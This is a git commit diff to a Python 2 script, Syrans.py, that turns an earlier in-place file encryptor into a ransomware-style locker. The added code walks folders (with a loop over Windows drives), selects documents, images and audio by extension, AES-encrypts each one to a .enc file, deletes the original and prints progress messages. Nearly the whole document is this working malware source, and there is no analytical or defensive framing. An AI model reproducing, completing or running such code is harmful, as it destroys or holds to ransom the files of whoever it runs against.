8cb2db5b77223a2ea1886254a53024693fdc2ede
luisxciv <luisxciv@gmail.com>
2017-04-11 13:19:08 -0400

    .

--- Syrans.py
+++ Syrans.py
@@ -1,40 +1,67 @@
 #!/usr/bin/python
-import os
-from hashlib import md5
+import os, random, struct, hashlib, time, win32api
 from Crypto.Cipher import AES
-from Crypto import Random
-password = "1234567"
 
-def derive_key_and_iv(password, salt, key_length, iv_length):
-    d = d_i = ''
-    while len(d) < key_length + iv_length:
-        d_i = md5(d_i + password + salt).digest()
-        d += d_i
-    return d[:key_length], d[key_length:key_length+iv_length]
-
-def encrypt(in_file, out_file, password, key_length=32):
-    bs = AES.block_size
-    salt = Random.new().read(bs - len('Salted__'))
-    key, iv = derive_key_and_iv(password, salt, key_length, bs)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    out_file.write('Crypting By Syfiends')
-    finished = False
-    while not finished:
-        chunk = in_file.read(1024 * bs)
-        if len(chunk) == 0 or len(chunk) % bs != 0:
-            padding_length = (bs - len(chunk) % bs) or bs
-            chunk += padding_length * chr(padding_length)
-            finished = True
-        out_file.write(cipher.encrypt(chunk))
-
-homedir = "."
+extensions = ['.mp3','.txt','.docx','.doc','.xlsx','.png','.jpg','jpeg']
+homedir = ".\File"
 path = os.path.join(homedir, "firstdir")
 
-for path, subdirs, files in os.walk(homedir):
-    for name in files:
-        glofile = os.path.join(path, name)
-        if os.path.isdir(glofile):
-            print "This is directory"
-        else:
-            with open(glofile, 'rb') as in_file, open(glofile, 'wb') as out_file:
-                encrypt(in_file, out_file, password)
+def encryption(key):
+    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
+        for root, dirs, files in os.walk(homedir):
+            for file in files:
+                if file.endswith(tuple(extensions)):
+                    in_filename = (os.path.join(root, file))
+
+                    print "[+] - Files found = [+]"
+                    print in_filename
+    
+                    #
+                    print "[!] - Encrypting files..."
+                    #
+                    encrypt(key,in_filename)
+                    print "[+] - Files are now encrypted."
+                    #
+    
+                 
+                    print "[!] - Deleting Original Files..."
+                    #
+                    os.remove(os.path.join(root, file))
+                    print "[+] - Original files deleted."
+    
+                    
+                    seconds = int(1)
+                    print "[+] - Next encryption in %s second" %seconds
+                    time.sleep(seconds)
+                    print
+
+    print "[+] - All files are now encrypted and replaced with a .enc file extension"
+
+def encrypt(key, in_filename, out_filename=None, chunksize=64*1024):
+    if not out_filename:
+        out_filename = in_filename + '.enc'
+    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    filesize = os.path.getsize(in_filename)
+
+    with open(in_filename, 'rb') as infile:
+        with open(out_filename, 'wb') as outfile:
+            outfile.write(struct.pack('<Q', filesize))
+            outfile.write(iv)
+            while True:
+                chunk = infile.read(chunksize)
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += ' ' * (16 - len(chunk) % 16)
+
+                outfile.write(encryptor.encrypt(chunk))
+
+def password():
+    password = raw_input('Enter encryption password: ')
+    key = hashlib.sha256(password).digest()
+    encryption(key)
+def main():
+    password()
+
+main()
